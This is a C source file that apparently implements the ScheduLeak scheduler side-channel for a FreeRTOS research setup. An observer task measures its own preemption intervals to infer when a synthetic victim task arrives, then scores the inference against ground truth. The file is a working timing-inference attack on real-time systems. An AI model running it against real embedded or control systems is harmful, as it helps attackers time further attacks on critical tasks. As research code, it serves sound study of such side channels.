/*
 * ScheduleakAttacker.c
 *
 *  Created on: Sep 11, 2017
 *      Author: cy
 */

#include <stdlib.h>

#include "ScheduleakAttacker.h"
#include "../LogUtility/AttackerLogUtility.h"
#include "../LogUtility/AppLogUtility.h"
#include "IntermittentInterval.h"
#include "../SyntheticTasks.h"


void prvObserverTask( void *pvParameters );
void initInferenceBase(u32 u32InVictimPeriod);
//void applyObserverTaskExecInterval(u32 u32ExecIntervalBeginTime, u32 u32ExecIntervalEndTime);
//u32 getArrivalTimeInference(void);
void initCapturedExecIntervals(void);
void addAnExecInterval(XTime begin, XTime end);

void createAttackerTasks(void) {
	xTaskCreate( prvObserverTask,			/* The function that implements the task. */
					"ObserverTask", 			/* The text name assigned to the task - for debug only as it is not used by the kernel. */
					5000, 				/* The size of the stack to allocate to the task. */
					NULL, 				/* The parameter passed to the task - not used in this case. */
					tskIDLE_PRIORITY+1, 	/* The priority assigned to the task. */
					NULL );
}

extern TickType_t firstTickCount;
extern TaskParam appTaskParamArray[];	// from SyntheticTasks.c
extern XTime firstGtTimeCount;	// From SyntheticTasks.c
CapturedExecIntervals capturedExecIntervals;
void prvObserverTask( void *pvParameters )
{
	// Initialize attacker's inference base.
	initInferenceBase(appTaskParamArray[VICTIM_TASK_ID_OFFSET].periodUs*333.333333);
	initCapturedExecIntervals();

	// Initialize the xLastWakeTime variable with the current time.
	TickType_t xLastWakeTime;

	xLastWakeTime = xTaskGetTickCount();
	// To align the start point of every application task.
	if (firstGtTimeCount == 0)
	{
		XTime_GetTime(&firstGtTimeCount);
		firstTickCount = xLastWakeTime;
	}
	else
	{
		xLastWakeTime = firstTickCount;
	}


	XTime u32ObserveBeginTime;
	XTime u32ObserveEndTime;
	//u32 u32TempLowHackerTimer;
	XTime u32ObserveTimeDiff;

	XTime u32CurrentExecIntervalBeginTime;
	XTime u32CurrentExecIntervalEndTime;

	//u32 u32HackerQueueData = 0;


	while (1) {
		feedAppLog(getTaskId(), 0, "BEGIN");

		XTime_GetTime(&u32ObserveBeginTime);
		//u32ObserveBeginTime = GET_GTIMER_LOWER;
		u32CurrentExecIntervalBeginTime = u32ObserveBeginTime;

		int i;
		for (i=0; i<100000; i++) {	//100000 = 5.7ms
			XTime_GetTime(&u32ObserveEndTime);
			//u32ObserveEndTime = GET_GTIMER_LOWER;

			if (u32ObserveEndTime >= u32ObserveBeginTime){
				u32ObserveTimeDiff = u32ObserveEndTime - u32ObserveBeginTime;
			} else {
				// It should never happen when XTime is used.
				u32ObserveTimeDiff = ((u32)(-1)) - u32ObserveBeginTime + u32ObserveEndTime;
			}

			/* If measured period is bigger than 1ms (this loop overhead is 218 counts), then it is a legitimate hacking period. */
			if (u32ObserveTimeDiff >= 500)
			{
				// Close the interval.
				u32CurrentExecIntervalEndTime = u32ObserveBeginTime;

				// Update the inference intervals.
				//applyObserverTaskExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);
				//u32 inferenceResult = getArrivalTimeInference();
				addAnExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);

				// Set begin time for the next execution interval.
				u32CurrentExecIntervalBeginTime = u32ObserveEndTime;

				// Inform high hacker task
//				u32HackerQueueData = u32ObserveTimeDiff;
//				if ( xQueueSend( hackerQueue, &u32HackerQueueData, ( TickType_t ) 0 ))	// Send the value to queue.
//				{
//					u32ObserveBeginTime = u32ObserveEndTime;
//				}
//				else
//				{
//					u32ObserveBeginTime = u32ObserveEndTime;
//				}

				//feedAttackerLog(getTaskId(), inferenceResult*3, "PRREMPT-INFERENCE");
			}

			u32ObserveBeginTime = u32ObserveEndTime;

		}

		// Close the last execution interval.
		u32CurrentExecIntervalEndTime = u32ObserveBeginTime;

		// Update the inference intervals.
		//feedAppLog(getTaskId(), 0, "Attacker-CheckPoint1");
		//applyObserverTaskExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);
		//feedAppLog(getTaskId(), 0, "Attacker-CheckPoint2");
		//u32 inferenceResult = getArrivalTimeInference();
		//feedAppLog(getTaskId(), 0, "Attacker-CheckPoint3");

		addAnExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);


		//feedAttackerLog(getTaskId(), inferenceResult*3, "INFERENCE");

		//feedAppLog(getTaskId(), 0, "END");

		vTaskDelayUntil( &xLastWakeTime, OBSERVER_TASK_PERIOD_US/1000/portTICK_RATE_MS );
	}
}

IntermittentInterval inferenceBase;
u32 u32VictimPeriod;
void initInferenceBase(u32 u32InVictimPeriod) {
	initInterInterval( &inferenceBase, 0, u32InVictimPeriod );
	u32VictimPeriod = u32InVictimPeriod;
}

// cost: 1500ns ~ 2000ns
void applyObserverTaskExecInterval(XTime u32ExecIntervalBeginTime, XTime u32ExecIntervalEndTime) {
	// update the intervals
	Interval thisInterval;
	initInterval( &thisInterval, u32ExecIntervalBeginTime, u32ExecIntervalEndTime );

	//TODO: Check if shifting is correct here.
	shiftInterval( &thisInterval, -(u64)((u64)u32ExecIntervalBeginTime/(u64)u32VictimPeriod)*(u64)u32VictimPeriod );

	Interval wholeBaseInterval;
	initInterval(&wholeBaseInterval, 0, u32VictimPeriod);

	// first period part.
	Interval intervalFirstPeriodPart;
	getIntersection( &wholeBaseInterval, &thisInterval, &intervalFirstPeriodPart );
	/* Debug */
	if (contains(&intervalFirstPeriodPart, firstGtTimeCount%u32VictimPeriod)) {
		int x=0;
		x++;
	}
	/* Debug End */
	InterInterval_updateUnion( &inferenceBase, &intervalFirstPeriodPart);

	// second period part.
	Interval intervalSecondPeriodPart;
	shiftInterval( &thisInterval, -u32VictimPeriod );
	if (thisInterval.length > 0) {
		if ( getIntersection( &wholeBaseInterval, &thisInterval, &intervalSecondPeriodPart ) == TRUE ) {
			/* Debug */
			if (contains(&intervalSecondPeriodPart, firstGtTimeCount%u32VictimPeriod)) {
				int x=0;
				x++;
			}
			/* Debug End */
			InterInterval_updateUnion( &inferenceBase, &intervalSecondPeriodPart);
		}
	}

}


// cost: 1300 ns
u32 getArrivalTimeInference(void) {
	// Get complementary intervals, find the largest interval and return the begin time.
	Interval largestComplInterval;
	InterInterval_getLargestComplementaryInterval(&inferenceBase, &largestComplInterval, TRUE);
	return largestComplInterval.begin;
}

void initCapturedExecIntervals(void) {
	capturedExecIntervals.count = 0;
}

void addAnExecInterval(u64 begin, u64 end) {
	Interval *newInterval;
	newInterval = &(capturedExecIntervals.intervals[capturedExecIntervals.count]);
	initInterval(newInterval, begin, end);

	// If the buffer is full, then don't add the counter (next time it will override the latest one).
	if (capturedExecIntervals.count+1 < MAX_CAPTURED_EXEC_INTERVAL_LIST_SIZE) {
		capturedExecIntervals.count ++;
	} else {
		//TODO: When it occurs you may want to increase MAX_CAPTURED_EXEC_INTERVAL_LIST_SIZE.
		//capturedExecIntervals.count = capturedExecIntervals.count;
		while (1) ;
	}
}

double computeInferencePrecisionRatio(u32 victimPeriod, XTime groundTruth, XTime inference) {

	u32 error = abs(groundTruth - inference);
	double precisionRatio;

	if (error > (victimPeriod/2)) {
		error = victimPeriod-error;
	}

	precisionRatio = 1 - ((double)error/(double)(victimPeriod/2));

	return precisionRatio;
}


/*
 * The source code of this function is from the following link:
 * http://www.math.wustl.edu/~victor/mfmm/compaa/gcd.c
 */
int gcd ( int a, int b )
{
  int c;
  while ( a != 0 ) {
     c = a; a = b%a;  b = c;
  }
  return b;
}

// https://stackoverflow.com/questions/4229870/c-algorithm-to-calculate-least-common-multiple-for-multiple-numbers
int lcm(int a, int b)
{
    int temp = gcd(a, b);

    return temp ? (a / temp * b) : 0;
}

void computeAndPrintInferenceResult(void) {

	/* GCD(p_o,p_v) */
	u32 u32VictimPeriodUs = appTaskParamArray[VICTIM_TASK_ID_OFFSET].periodUs;
	u32 gcdPoPvUs = gcd(OBSERVER_TASK_PERIOD_US, u32VictimPeriodUs);
	u32 lcmPoPvUs = lcm(OBSERVER_TASK_PERIOD_US, u32VictimPeriodUs);
	xil_printf("\r\nGCD(po,pv) = %d us\r\n", gcdPoPvUs);
	xil_printf("LCM(po,pv) = %d us\r\n", lcmPoPvUs);

	/* Compute observation duration. */
	XTime lastTimeStamp = capturedExecIntervals.intervals[capturedExecIntervals.count-1].end;
	double observationDurationInLcmPoPv = (double)(lastTimeStamp-firstGtTimeCount)/(double)(lcmPoPvUs*333);
	//double observationDurationInLcmPoPv = (double)((lastTimeStamp-firstGtTimeCount)/(lcmPoPvUs*333));

	char observationDurationString[20];
	gcvt(observationDurationInLcmPoPv,10,observationDurationString);
	xil_printf("Observation Duration in LCM(po,pv) = %s\r\n", observationDurationString);

	u32 i;
	Interval *thisInterval;
	Boolean dataInvalid = False;
	for (i=0; i<capturedExecIntervals.count; i++) {
		thisInterval = &(capturedExecIntervals.intervals[i]);
		applyObserverTaskExecInterval(thisInterval->begin, thisInterval->end);

		if (thisInterval->begin < firstGtTimeCount) {
			dataInvalid = True;
		}
	}
	u32 inferenceResult = getArrivalTimeInference();

	if (dataInvalid == True) {
		xil_printf("\r\nInvalid data!!\r\n");
	}

	xil_printf("\r\nInference Result = %d ns \r\n", inferenceResult*3);


	/* Compute precision ratio. */
	u32 victimPeriod = inferenceBase.baseEnd;
	u32 initialArrival = firstGtTimeCount%victimPeriod;

	double precisionRatio = computeInferencePrecisionRatio(victimPeriod, initialArrival, inferenceResult);

	char output[20];
	gcvt(precisionRatio,10,output);

	xil_printf("PrecisionRatio = %s\r\n", output);

	xil_printf("Victim Period = %d\r\n", victimPeriod*3);

	/* Print captured intervals (not inference intervals). */
	InterInterval_outputIntervals(&inferenceBase);

}
